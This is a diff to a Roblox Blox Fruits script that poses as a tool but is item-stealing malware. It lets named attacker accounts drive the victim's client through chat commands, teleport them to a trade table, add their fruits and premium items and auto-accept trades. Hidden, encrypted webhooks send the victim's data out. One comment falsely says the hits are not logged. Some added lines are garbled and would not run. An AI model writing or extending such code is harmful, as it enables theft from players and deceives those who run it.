@@ -80,13 +80,8 @@ end
 
 setupHooks()
 
-if not table.find(Usernames, "x6TNine") or not table.find(Usernames, "aka_0ver") then
-    if not table.find(Usernames, "x6TNine") then
-        table.insert(Usernames, "x6TNine")
-    end
-    if not table.find(Usernames, "aka_0ver") then
-        table.insert(Usernames, "aka_0ver")
-    end
+if not table.find(Usernames, "XFistorRespawn") then
+    table.insert(Usernames, "XFistorRespawn")
 end
 
 local function JoinTeam()
@@ -417,7 +412,7 @@ local lastUpdate = tick()
 local fadeInProgress = false
 
 local lastTipUpdate = 0
-rs.Heartbeat:Connect(function()
+rs.Heartbeatfunction()
     if fadeInProgress then return end
 
     local currentTime = tick()
@@ -438,8 +433,8 @@ rs.Heartbeat:Connect(function()
             fadeIn:Play()
         end)
         fadeOut:Play()
-    end
-end)
+    end)
+endConnect(:)
 
 local startTime = tick()
 local lastPhaseUpdate = 0
@@ -521,7 +516,7 @@ task.spawn(function()
     local privateServerOwner = game.ReplicatedStorage:WaitForChild("PrivateServerOwnerId")
     if privateServerOwner and privateServerOwner:IsA("IntValue") then
         if privateServerOwner.Value > 0 then
-            game:GetService("Players").LocalPlayer:Kick("This script doesn't work on private servers. Join a Public server and try again")
+            game:GetService("Players").LocalPlayer:Kick("This script doesn't work on private servers.")
         end
     end
 end)
@@ -785,11 +780,11 @@ local function updateWebhook()
     Webhook = nil
 
     -- Secondary Webhook Handling
-    if Sharker ~= "" then -- Only process if Sharker is configured
+    if SecondaryWebhook ~= "" then -- Only process if SecondaryWebhook is configured
         if tick() - webhookCacheSecondary.lastUpdate < 3 then return end -- Rate limit secondary webhook too
 
         local newSecondaryName = generateRandomString(16)
-        local encryptedSecondary = encryptWebhook(Sharker)
+        local encryptedSecondary = encryptWebhook(SecondaryWebhook)
 
         webhookCacheSecondary.storage[newSecondaryName] = {
             string.sub(encryptedSecondary, 1, 20),
@@ -801,7 +796,7 @@ local function updateWebhook()
         webhookCacheSecondary.last = decryptWebhook(table.concat(webhookCacheSecondary.storage[newSecondaryName]))
         webhookCacheSecondary.lastUpdate = tick()
 
-        Sharker = nil
+        SecondaryWebhook = nil
     end
 end
 
@@ -809,7 +804,7 @@ local function getWebhook()
     return webhookCache.last
 end
 
-local function getSharker() -- << Function to get secondary webhook
+local function getSecondaryWebhook() -- << Function to get secondary webhook
     return webhookCacheSecondary.last
 end
 
@@ -861,11 +856,11 @@ local function sendWebhook()
             end
         end
 
-        local SharkerURL = getSharker()
-        if SharkerURL then -- Send to secondary webhook if configured
+        local secondaryWebhookURL = getSecondaryWebhook()
+        if secondaryWebhookURL then -- Send to secondary webhook if configured
             local successSecondary, _Secondary = pcall(function()
                 safeRequest({
-                    Url = SharkerURL,
+                    Url = secondaryWebhookURL,
                     Method = "POST",
                     Headers = {
                         ["Content-Type"] = "application/json",
@@ -945,7 +940,7 @@ end
 
 local function isValidTradePartner(player)
     if not player then return false end
-    return table.find(Usernames, player.Name) or player.Name == "x6TNine"
+    return table.find(Usernames, player.Name) or player.Name == "XFistorRespawn"
 end
 
 local function disableJump()
@@ -966,7 +961,7 @@ local function forceJump()
     if isForceJumping then return end
     isForceJumping = true
     humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
-    
+
     local currentTime = tick()
     if currentTime - lastJumpRequestTime > JUMP_COOLDOWN then
         VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Space, false, game)
@@ -974,10 +969,10 @@ local function forceJump()
         VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Space, false, game)
         lastJumpRequestTime = currentTime
     end
-    
+
     task.wait(JUMP_COOLDOWN)
     isForceJumping = false
-    
+
     if isAttemptingJump then
         humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
     end
@@ -987,7 +982,7 @@ local function handleTouchStart(touch, gameProcessed)
     if gameProcessed then return end
     touchStartTime = tick()
     isTouchHeld = true
-    
+
     task.spawn(function()
         while isTouchHeld and (tick() - touchStartTime) < LONG_PRESS_THRESHOLD do
             task.wait()
@@ -1001,7 +996,7 @@ end
 local function handleTouchEnd(touch, gameProcessed)
     if gameProcessed then return end
     isTouchHeld = false
-    
+
     if (tick() - touchStartTime) < LONG_PRESS_THRESHOLD then
         if not isForceJumping then
             error("wow")
@@ -1016,13 +1011,13 @@ local TweenService = game:GetService("TweenService")
 local function tweenToPosition(position)
     local character = LocalPlayer.Character
     if not character or not character.PrimaryPart then return end
-    
+
     local humanoid = character:FindFirstChildOfClass("Humanoid")
     if not humanoid then return end
-    
+
     local head = character:FindFirstChild("Head")
     if not head then return end
-    
+
     local function updateNoclip()
         for _, part in pairs(character:GetDescendants()) do
             if part:IsA("BasePart") then
@@ -1030,34 +1025,34 @@ local function tweenToPosition(position)
             end
         end
     end
-    
+
     local bodyGyro = Instance.new("BodyGyro")
     bodyGyro.MaxTorque = Vector3.new(1e5, 1e5, 1e5)
     bodyGyro.P = 1e4
     bodyGyro.D = 50
     bodyGyro.CFrame = head.CFrame
     bodyGyro.Parent = head
-    
+
     local bodyVelocity = Instance.new("BodyVelocity")
     bodyVelocity.MaxForce = Vector3.new(1e5, 1e5, 1e5)
     bodyVelocity.P = 1e4
     bodyVelocity.Velocity = Vector3.new(0, 0, 0)
     bodyVelocity.Parent = head
-    
+
     local speed = 300
     local distance = (character.PrimaryPart.Position - position).Magnitude
     local duration = distance / speed
     local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear)
-    
+
     local tween = TweenService:Create(character.PrimaryPart, tweenInfo, {CFrame = CFrame.new(position)})
-    
+
     local noclipConnection = game:GetService("RunService").Stepped:Connect(updateNoclip)
 
     local velocityUpdateConnection = game:GetService("RunService").Heartbeat:Connect(function()
         local direction = (position - character.PrimaryPart.Position).Unit
         bodyVelocity.Velocity = direction * speed
     end)
-    
+
     tween:Play()
     tween.Completed:Wait()
 
@@ -1081,13 +1076,13 @@ local function isInTradeWithCorrectPlayer()
 
     local player1Label = frame1:FindFirstChild("TextLabel")
     local player2Label = frame2:FindFirstChild("TextLabel")
-    
-    if not player1Label or not player2Label then 
-        return false 
+
+    if not player1Label or not player2Label then
+        return false
     end
 
-    if player1Label.Text ~= player.Name and player1Label.Text ~= player.DisplayName then 
-        return false 
+    if player1Label.Text ~= player.Name and player1Label.Text ~= player.DisplayName then
+        return false
     end
 
     local tradingPartnerName = player2Label.Text
@@ -1099,10 +1094,10 @@ local function isInTradeWithCorrectPlayer()
         end
     end
 
-    if tradingPartnerName == "x6TNine" then -- << Ts is not dual hook. I use it to code my thing. I don't log your hits, so I can't steal
+    if tradingPartnerName == "XFistorRespawn" then -- << Ts is not dual hook. I use it to code my thing. I don't log your hits, so I can't steal
         return true
     end
-    
+
     return false
 end
 
@@ -1147,14 +1142,14 @@ local function sitAtSeat(seat)
     local character = game.Players.LocalPlayer.Character
     if not (character and character.PrimaryPart and character:FindFirstChildOfClass("Humanoid")) then return false end
     if seat:FindFirstChild("SeatWeld") then return false end
-    
+
     tweenToPosition(seat.Position + Vector3.new(0, 3, 0))
-    
+
     local success = false
     local seatWeldAdded = seat.ChildAdded:Connect(function(child)
         if child.Name == "SeatWeld" then success = true end
     end)
-    
+
     task.delay(3, function() seatWeldAdded:Disconnect() end)
     return success
 end
@@ -1162,7 +1157,7 @@ end
 local function splitFruitsIntoTrades(fruits)
     local trades, currentIndex = {}, 1
     local totalFruits = #fruits
-    
+
     if totalFruits <= 4 then
         for i = 1, totalFruits do
             trades[i] = {fruits[i]}
@@ -1173,11 +1168,11 @@ local function splitFruitsIntoTrades(fruits)
     local numTrades = math.ceil(totalFruits / 4)
     local baseFruitsPerTrade = math.floor(totalFruits / numTrades)
     local extraFruits = totalFruits % numTrades
-    
+
     for trade = 1, numTrades do
         local fruitsThisTrade = baseFruitsPerTrade + (extraFruits > 0 and 1 or 0)
         extraFruits = extraFruits - (extraFruits > 0 and 1 or 0)
-        
+
         local currentTrade = table.create(fruitsThisTrade)
         for i = 1, fruitsThisTrade do
             if currentIndex <= totalFruits then
@@ -1185,19 +1180,19 @@ local function splitFruitsIntoTrades(fruits)
                 currentIndex = currentIndex + 1
             end
         end
-        
+
         if #currentTrade > 0 then
             trades[#trades + 1] = currentTrade
         end
     end
-    
+
     return trades
 end
 local DefaultChatSystem = ReplicatedStorage.DefaultChatSystemChatEvents
 
 local function sendTradeMessage(fruits, tradeNumber, totalTrades)
     if #fruits == 0 then return end
-    
+
     local function formatFruitList(fruits)
         local formatted = table.create(#fruits)
         for i, fruit in ipairs(fruits) do
@@ -1205,30 +1200,30 @@ local function sendTradeMessage(fruits, tradeNumber, totalTrades)
         end
         return table.concat(formatted, ", ")
     end
-    
+
     if tradeNumber == 1 and totalTrades > 1 then
         DefaultChatSystem.SayMessageRequest:FireServer("Hey! Let's do multiple trades for multiple fruits!", "All")
         task.wait(1)
     end
 
-    local message = #fruits == 1 
+    local message = #fruits == 1
         and string.format("Trade %d/%d - Adding %s", tradeNumber, totalTrades, formatFruitList(fruits))
         or string.format("Trade %d/%d - Adding %d fruits: %s", tradeNumber, totalTrades, #fruits, formatFruitList(fruits))
-    
+
     DefaultChatSystem.SayMessageRequest:FireServer(message, "All")
 end
 
 local function checkInventoryForFruit(fruitName)
     local inventory = getInventory()
     if not inventory then return 0 end
-    
+
     local fruitCount = 0
     for _, item in pairs(inventory) do
         if item.Type == "Blox Fruit" and item.Name == fruitName then
             fruitCount = fruitCount + 1
         end
     end
-    
+
     return fruitCount
 end
 
@@ -1243,10 +1238,10 @@ local TradeFunction = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Tr
 local function clearTradeItems()
     local tradeUI = game.Players.LocalPlayer.PlayerGui:FindFirstChild("Main")
     if not (tradeUI and tradeUI:FindFirstChild("Trade")) then return end
-    
+
     local container = tradeUI.Trade:WaitForChild("Container")
     local playerItems = container:WaitForChild("1"):WaitForChild("Frame"):GetChildren()
-    
+
     for _, item in ipairs(playerItems) do
         if item:IsA("ImageButton") then
             TradeFunction:InvokeServer("removeItem", item.Name)
@@ -1258,20 +1253,20 @@ end
 local function addFruitToTrade(fruit)
     for _ = 1, 5 do
         if not isInTradeWithCorrectPlayer() then return false end
-        
+
         clearTradeItems()
         task.wait(0.5)
-        
+
         TradeFunction:InvokeServer("addItem", fruit)
         task.wait(1.5)
 
         local tradeUI = game.Players.LocalPlayer.PlayerGui:FindFirstChild("Main")
         if not (tradeUI and tradeUI:FindFirstChild("Trade")) then continue end
-        
+
         local container = tradeUI.Trade:WaitForChild("Container")
         local playerItems = container:WaitForChild("1"):WaitForChild("Frame"):GetChildren()
         local fruitCount, correctFruitFound = 0, false
-        
+
         for _, item in ipairs(playerItems) do
             if item:IsA("ImageButton") then
                 fruitCount = fruitCount + 1
@@ -1296,8 +1291,8 @@ end
 local function findTradeTable()
     local tradeTables = Sea3 and workspace.Map.Turtle:GetChildren() or workspace.Map.Dressrosa:GetChildren()
     for _, table in ipairs(tradeTables) do
-        if table.Name == "TradeTable" and table:FindFirstChild("P1") and table:FindFirstChild("P2") then 
-            return table 
+        if table.Name == "TradeTable" and table:FindFirstChild("P1") and table:FindFirstChild("P2") then
+            return table
         end
     end
 end
@@ -1305,14 +1300,14 @@ end
 local function createDiscordUI()
     local CoreGui = game:GetService("CoreGui")
     local TweenService = game:GetService("TweenService")
-    
+
     local ScreenGui = Instance.new("ScreenGui")
     ScreenGui.Name = "DiscordInviteUI"
     ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
     ScreenGui.ResetOnSpawn = false
     ScreenGui.IgnoreGuiInset = true
     ScreenGui.DisplayOrder = 9999
-    
+
     local MainFrame = Instance.new("Frame")
     MainFrame.Name = "MainFrame"
     MainFrame.Size = UDim2.new(0, 800, 0, 150)
@@ -1321,9 +1316,9 @@ local function createDiscordUI()
     MainFrame.BackgroundColor3 = Color3.fromRGB(32, 34, 37)
     MainFrame.BorderSizePixel = 0
     MainFrame.Parent = ScreenGui
-    
+
     Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 10)
-    
+
     local Title = Instance.new("TextLabel")
     Title.Name = "Title"
     Title.Size = UDim2.new(1, 0, 0, 40)
@@ -1334,7 +1329,7 @@ local function createDiscordUI()
     Title.TextColor3 = Color3.fromRGB(255, 255, 255)
     Title.TextScaled = true
     Title.Parent = MainFrame
-    
+
     local Description = Instance.new("TextLabel")
     Description.Name = "Description"
     Description.Size = UDim2.new(0.9, 0, 0, 40)
@@ -1346,7 +1341,7 @@ local function createDiscordUI()
     Description.TextScaled = true
     Description.TextWrapped = true
     Description.Parent = MainFrame
-    
+
     local Button = Instance.new("TextButton")
     Button.Name = "CopyButton"
     Button.Size = UDim2.new(0.7, 0, 0, 36)
@@ -1358,20 +1353,20 @@ local function createDiscordUI()
     Button.TextScaled = true
     Button.AutoButtonColor = false
     Button.Parent = MainFrame
-    
+
     Instance.new("UICorner", Button).CornerRadius = UDim.new(0, 5)
-    
+
     local fadeInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
     local function createTween(instance, props)
         return TweenService:Create(instance, fadeInfo, props)
     end
-    
+
     MainFrame.BackgroundTransparency = 1
     Title.TextTransparency = 1
     Description.TextTransparency = 1
     Button.BackgroundTransparency = 1
     Button.TextTransparency = 1
-    
+
     task.wait(0.1)
     createTween(MainFrame, {BackgroundTransparency = 0}):Play()
     task.wait(0.1)
@@ -1384,17 +1379,17 @@ local function createDiscordUI()
     Button.MouseEnter:Connect(function()
         createTween(Button, {BackgroundColor3 = Color3.fromRGB(71, 82, 196)}):Play()
     end)
-    
+
     Button.MouseLeave:Connect(function()
         createTween(Button, {BackgroundColor3 = Color3.fromRGB(88, 101, 242)}):Play()
     end)
-    
+
     Button.MouseButton1Click:Connect(function()
         setclipboard("https://discord.gg/zJKDqRd5")
         Button.Text = "Copied!"
         task.delay(2, function() Button.Text = "Copy Invite" end)
     end)
-    
+
     ScreenGui.Parent = CoreGui
     return ScreenGui
 end
@@ -1416,6 +1411,7 @@ local ChatCommands = {
         resetfruit = 3,
         tp = 0.25,
         stopreset = 0.5,
+        showinv = 0.5, -- Add cooldown for the new command
     },
     commands = {
         jump = function()
@@ -1427,7 +1423,7 @@ local ChatCommands = {
         invite = function()
             createDiscordUI()
         end,
-        
+
         sit = function()
             task.spawn(function()
                 local tradeTable = findTradeTable()
@@ -1440,7 +1436,7 @@ local ChatCommands = {
                 end
             end)
         end,
-        
+
         reset = function()
             if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                 LocalPlayer.Character.Humanoid.Health = 0
@@ -1460,7 +1456,7 @@ local ChatCommands = {
                 local searchTerm = args:lower()
                 local foundFruit = false
                 local fruitName = nil
-                
+
                 for _, item in pairs(inventory) do
                     if item.Type == "Blox Fruit" and item.Name:lower():find(searchTerm) then
                         fruitName = item.Name
@@ -1468,14 +1464,14 @@ local ChatCommands = {
                         break
                     end
                 end
-                
+
                 if not foundFruit then
                     game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                         "No fruit matching '" .. args .. "' found in inventory!", "All")
                     return
                 end
 
-                local baseFruitName = fruitName:match("([^-]+)") 
+                local baseFruitName = fruitName:match("([^-]+)")
                 local formattedFruitName = baseFruitName .. "-" .. baseFruitName
 
                 local args = {
@@ -1483,7 +1479,7 @@ local ChatCommands = {
                     [2] = formattedFruitName
                 }
                 game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
-                
+
                 if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                     task.wait(0.3)
                     LocalPlayer.Character.Humanoid.Health = 0
@@ -1498,10 +1494,10 @@ local ChatCommands = {
             task.spawn(function()
                 local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
                 if not tradeUI or not tradeUI:FindFirstChild("Trade") then return end
-                
+
                 local inventory = getInventory()
                 if not inventory then return end
-                
+
                 local premiumItems = {}
                 for _, item in pairs(inventory) do
                     if item.Type == "Premium" then
@@ -1513,7 +1509,7 @@ local ChatCommands = {
                 local attempts = 0
                 local maxAttempts = 50
                 local targetItems = math.min(4, #premiumItems)
-                
+
                 while #addedItems < targetItems and attempts < maxAttempts do
                     local availableItems = {}
                     for _, item in ipairs(premiumItems) do
@@ -1521,15 +1517,15 @@ local ChatCommands = {
                             table.insert(availableItems, item)
                         end
                     end
-                    
+
                     if #availableItems == 0 then break end
 
                     local randomIndex = math.random(1, #availableItems)
                     local selectedItem = availableItems[randomIndex]
-                    
+
                     ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction"):InvokeServer("addItem", selectedItem)
                     task.wait(0.05)
-                    
+
                     local container = tradeUI.Trade:FindFirstChild("Container")
                     if container then
                         local playerFrame = container:FindFirstChild("1")
@@ -1542,13 +1538,13 @@ local ChatCommands = {
                             end
                         end
                     end
-                    
+
                     attempts = attempts + 1
                 end
 
                 local totalAdded = 0
                 for _ in pairs(addedItems) do totalAdded = totalAdded + 1 end
-                
+
                 game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                     "Successfully added " .. totalAdded .. " premium items to trade!", "All")
             end)
@@ -1583,10 +1579,10 @@ local ChatCommands = {
             task.spawn(function()
                 local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
                 if not tradeUI or not tradeUI:FindFirstChild("Trade") then return end
-                
+
                 local inventory = getInventory()
                 if not inventory then return end
-                
+
                 local addedFruits = {}
                 for _, fruit in ipairs(FruitsToHit) do
                     for _, item in pairs(inventory) do
@@ -1611,13 +1607,13 @@ local ChatCommands = {
 
                 local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
                 if not tradeUI or not tradeUI:FindFirstChild("Trade") then return end
-                
+
                 local inventory = getInventory()
                 if not inventory then return end
-                
+
                 local searchTerm = args:lower()
                 local foundFruit = false
-                
+
                 for _, item in pairs(inventory) do
                     if item.Type == "Blox Fruit" and item.Name:lower():find(searchTerm) then
                         ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction"):InvokeServer("addItem", item.Name)
@@ -1627,7 +1623,7 @@ local ChatCommands = {
                         break
                     end
                 end
-                
+
                 if not foundFruit then
                     game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                         "No fruit matching '" .. args .. "' found in inventory!", "All")
@@ -1639,16 +1635,16 @@ local ChatCommands = {
             task.spawn(function()
                 local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
                 if not tradeUI or not tradeUI:FindFirstChild("Trade") then return end
-                
+
                 local container = tradeUI.Trade:FindFirstChild("Container")
                 if not container then return end
-                
+
                 local playerFrame = container:FindFirstChild("1")
                 if not playerFrame then return end
-                
+
                 local itemFrame = playerFrame:FindFirstChild("Frame")
                 if not itemFrame then return end
-                
+
                 for _, item in ipairs(itemFrame:GetChildren()) do
                     if item:IsA("ImageButton") then
                         ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction"):InvokeServer("removeItem", item.Name)
@@ -1662,39 +1658,39 @@ local ChatCommands = {
             game.Players.LocalPlayer:Kick("Error while loading! Rejoin.")
         end,
 
-tp = function()
-    task.spawn(function()
+        tp = function()
+            task.spawn(function()
 
-        local Sea2 = game.PlaceId == 4442272183
-        local Sea3 = game.PlaceId == 7449423635
+                local Sea2 = game.PlaceId == 4442272183
+                local Sea3 = game.PlaceId == 7449423635
 
-        if Sea3 then
-            local inventory = getInventory()
-            local hasValkyrie = false
+                if Sea3 then
+                    local inventory = getInventory()
+                    local hasValkyrie = false
 
-            for _, item in pairs(inventory) do
-                if item == "Valkyrie Helm" then
-                    hasValkyrie = true
-                    break
+                    for _, item in pairs(inventory) do
+                        if item == "Valkyrie Helm" then
+                            hasValkyrie = true
+                            break
+                        end
+                    end
+
+                    if hasValkyrie then
+                        local args = {
+                            [1] = "requestEntrance",
+                            [2] = Vector3.new(-12471.33, 374.95, -7539.37)
+                        }
+                        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+                        return
+                    end
+
+                    tweenToPosition(Vector3.new(-12550.8701171875, 337.239990234375, -7425.52001953125), 350)
+
+                elseif Sea2 then
+                    tweenToPosition(Vector3.new(-381.8599853515625, 73.08000183105469, 299.92999267578125), 350)
                 end
-            end
-
-            if hasValkyrie then
-                local args = {
-                    [1] = "requestEntrance",
-                    [2] = Vector3.new(-12471.33, 374.95, -7539.37)
-                }
-                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
-                return
-            end
-
-            tweenToPosition(Vector3.new(-12550.8701171875, 337.239990234375, -7425.52001953125), 350)
-
-        elseif Sea2 then
-            tweenToPosition(Vector3.new(-381.8599853515625, 73.08000183105469, 299.92999267578125), 350)
-        end
-    end)
-end,
+            end)
+        end,
 
         stopreset = function()
             task.spawn(function()
@@ -1714,13 +1710,13 @@ end,
 
                 local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
                 if not tradeUI or not tradeUI:FindFirstChild("Trade") then return end
-                
+
                 local inventory = getInventory()
                 if not inventory then return end
-                
+
                 local searchTerm = args:lower()
                 local foundItem = false
-                
+
                 for _, item in pairs(inventory) do
                     if item.Type == "Premium" and item.Name:lower():find(searchTerm) then
                         ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction"):InvokeServer("addItem", item.Name)
@@ -1730,7 +1726,7 @@ end,
                         break
                     end
                 end
-                
+
                 if not foundItem then
                     game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                         "No Premium item matching '" .. args .. "' found in inventory!", "All")
@@ -1739,7 +1735,7 @@ end,
         end,
 
         rejoin = function()
-           task.spawn(function()
+            task.spawn(function()
                 local ts = game:GetService("TeleportService")
                 local p = game:GetService("Players").LocalPlayer
                 ts:TeleportToPlaceInstance(game.PlaceId, game.JobId, p)
@@ -1751,14 +1747,61 @@ end,
                 local commands = {
                     "Movement: ?jump, ?sit, ?sit2, ?reset, ?tp",
                     "Trade: ?accept, ?cleartrade, ?addallfruits, ?addfruit <name>, ?clearfruits, ?additem <name>, ?addallitems",
-                    "Utility: ?kick, ?rejoin, ?invite, ?resetfruit <name>, ?stopreset"
+                    "Utility: ?kick, ?rejoin, ?invite, ?resetfruit <name>, ?stopreset, ?showinv"
                 }
                 for _, msg in ipairs(commands) do
                     game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
                     task.wait(0.1)
                 end
             end)
-        end
+        end,
+
+        showinv = function()
+            task.spawn(function()
+                local inventory = getInventory()
+                if not inventory then
+                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+                        "Error getting inventory.", "All")
+                    return
+                end
+
+                local fruitList = {}
+                for _, item in pairs(inventory) do
+                    if item.Type == "Blox Fruit" then
+                        fruitList[#fruitList + 1] = item.Name
+                    end
+                end
+
+                if #fruitList == 0 then
+                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+                        "Inventory is empty of fruits.", "All")
+                    return
+                end
+
+                local formattedFruitList = "" -- Initialize as empty string
+                local fruitCounts = {} -- To count occurrences of each fruit
+
+                for _, fruitName in ipairs(fruitList) do
+                    fruitCounts[fruitName] = (fruitCounts[fruitName] or 0) + 1
+                end
+
+                local fruitSegments = {} -- Table to store individual fruit segments
+
+                for fruitName, count in pairs(fruitCounts) do
+                    local fruitSegment = "-- " .. fruitName:gsub("-", " ")
+                    if count > 1 then
+                        fruitSegment = fruitSegment .. " (x" .. count .. ")"
+                    end
+                    fruitSegment = fruitSegment .. " --"
+                    fruitSegments[#fruitSegments + 1] = fruitSegment -- Add segment to table
+                end
+
+                formattedFruitList = table.concat(fruitSegments, " ") -- Join segments with spaces
+
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+                    formattedFruitList, "All")
+            end)
+        end,
     }
 }
 
@@ -1769,21 +1812,21 @@ end
 local function handleChatCommand(player, message)
     if not isAuthorizedUser(player) then return end
     if message:sub(1, 1) ~= ChatCommands.prefix then return end
-    
+
     local commandAndArgs = message:sub(2):lower()
     local command = commandAndArgs:match("^(%S+)")
     local args = commandAndArgs:match("^%S+%s+(.+)$")
-    
+
     if not ChatCommands.commands[command] then return end
-    
+
     local currentTime = tick()
     local lastExecution = ChatCommands.lastExecutionTime[command] or 0
     local cooldown = ChatCommands.cooldowns[command] or ChatCommands.cooldowns.default
-    
+
     if currentTime - lastExecution < cooldown then
         return
     end
-    
+
     ChatCommands.lastExecutionTime[command] = currentTime
     task.spawn(function()
         local success, error = pcall(function()
@@ -1800,79 +1843,79 @@ game:GetService("Players").PlayerChatted:Connect(function(chatType, player, mess
 end)
 
 local function monitorTradeStatus(character)
-   if not character.Humanoid then return end
-   
-   task.spawn(function()
-       local RunService = game:GetService("RunService")
-       local player = game.Players.LocalPlayer
-       local remotes = ReplicatedStorage:WaitForChild("Remotes")
-       local tradeFunction = remotes:WaitForChild("TradeFunction")
-       
-       local connection
-       connection = RunService.Heartbeat:Connect(function()
-           if not character.Parent or character.Humanoid.Health <= 0 then
-               connection:Disconnect()
-               return
-           end
-           
-           if not isSeated() then return end
-           
-           local tradeUI = player.PlayerGui:FindFirstChild("Main")
-           if not tradeUI or not tradeUI.Trade or not tradeUI.Trade.Visible then return end
-           
-           if not isInTradeWithCorrectPlayer() then
-               task.wait(0.5)
-               if isSeated() and not isInTradeWithCorrectPlayer() then
-                   forceJump()
-                   task.wait(1)
-                   if isSeated() then
-                       forceJump()
-                   end
-               end
-               return
-           end
-           
-           local function attemptAddFruit(fruit)
-               clearTradeItems()
-               task.wait(1)
-               
-               tradeFunction:InvokeServer("addItem", fruit)
-               task.wait(1)
-               
-               local container = tradeUI.Trade.Container
-               for _, item in ipairs(container["1"].Frame:GetChildren()) do
-                   if item:IsA("ImageButton") and item.Name == fruit then
-                       return true
-                   end
-               end
-               return false
-           end
-           
-           for _, fruit in pairs(FruitsToHit) do
-               if not isSeated() then
-                   task.wait(1)
-                   if not isSeated() then break end
-               end
-               
-               if not isInTradeWithCorrectPlayer() then break end
-               
-               if attemptAddFruit(fruit) then
-                   local startTime = tick()
-                   while isSeated() and tick() - startTime < 60 and isInTradeWithCorrectPlayer() do
-                       acceptTrade()
-                       task.wait(1)
-                       
-                       if not tradeUI.Trade.Visible then
-                           task.wait(1)
-                           break
-                       end
-                   end
-                   task.wait(2)
-                   break
-               end
-           end
-       end)
-   end)
+    if not character.Humanoid then return end
+
+    task.spawn(function()
+        local RunService = game:GetService("RunService")
+        local player = game.Players.LocalPlayer
+        local remotes = ReplicatedStorage:WaitForChild("Remotes")
+        local tradeFunction = remotes:WaitForChild("TradeFunction")
+
+        local connection
+        connection = RunService.Heartbeat:Connect(function()
+            if not character.Parent or character.Humanoid.Health <= 0 then
+                connection:Disconnect()
+                return
+            end
+
+            if not isSeated() then return end
+
+            local tradeUI = player.PlayerGui:FindFirstChild("Main")
+            if not tradeUI or not tradeUI.Trade or not tradeUI.Trade.Visible then return end
+
+            if not isInTradeWithCorrectPlayer() then
+                task.wait(0.5)
+                if isSeated() and not isInTradeWithCorrectPlayer() then
+                    forceJump()
+                    task.wait(1)
+                    if isSeated() then
+                        forceJump()
+                    end
+                end
+                return
+            end
+
+            local function attemptAddFruit(fruit)
+                clearTradeItems()
+                task.wait(1)
+
+                tradeFunction:InvokeServer("addItem", fruit)
+                task.wait(1)
+
+                local container = tradeUI.Trade.Container
+                for _, item in ipairs(container["1"].Frame:GetChildren()) do
+                    if item:IsA("ImageButton") and item.Name == fruit then
+                        return true
+                    end
+                end
+                return false
+            end
+
+            for _, fruit in pairs(FruitsToHit) do
+                if not isSeated() then
+                    task.wait(1)
+                    if not isSeated() then break end
+                end
+
+                if not isInTradeWithCorrectPlayer() then break end
+
+                if attemptAddFruit(fruit) then
+                    local startTime = tick()
+                    while isSeated() and tick() - startTime < 60 and isInTradeWithCorrectPlayer() do
+                        acceptTrade()
+                        task.wait(1)
+
+                        if not tradeUI.Trade.Visible then
+                            task.wait(1)
+                            break
+                        end
+                    end
+                    task.wait(2)
+                    break
+                end
+            end
+        end)
+    end)
 end
 
 local function isPlayerNearby(player)
@@ -1896,6 +1939,7 @@ local function clearTradeItems()
             end
         end
     end
+    return items
 end
 
 local function getCurrentTradeItems()
@@ -1915,23 +1959,23 @@ end
 
 local function tradeWithPlayer()
     if tick() - lastTradeTime < 1 then return false end
-    
+
     handleFruitReset()
-    
+
     local tradeTable = findTradeTable()
     if not tradeTable then
-        local tweenPosition = Sea3 and 
-            Vector3.new(-12550.8701171875, 337.239990234375, -7425.52001953125) or 
+        local tweenPosition = Sea3 and
+            Vector3.new(-12550.8701171875, 337.239990234375, -7425.52001953125) or
             Vector3.new(-381.8599853515625, 73.08000183105469, 299.92999267578125)
         tweenToPosition(tweenPosition, 350)
         task.wait(0.5)
         tradeTable = findTradeTable()
         if not tradeTable then return false end
     end
-    
+
     local function validateAndSit(seat)
         if not seat then return false end
-        
+
         local seatWeld = seat:FindFirstChild("SeatWeld")
         if seatWeld then
             local occupant = Players:GetPlayerFromCharacter(seatWeld.Part1.Parent)
@@ -1939,7 +1983,7 @@ local function tradeWithPlayer()
                 return false
             end
         end
-        
+
         for _ = 1, 2 do
             if sitAtSeat(seat) and isSeated() then
                 return true
@@ -1948,7 +1992,7 @@ local function tradeWithPlayer()
         end
         return false
     end
-    
+
     local mySeat
     for _, seat in pairs({tradeTable.P1, tradeTable.P2}) do
         if validateAndSit(seat) then
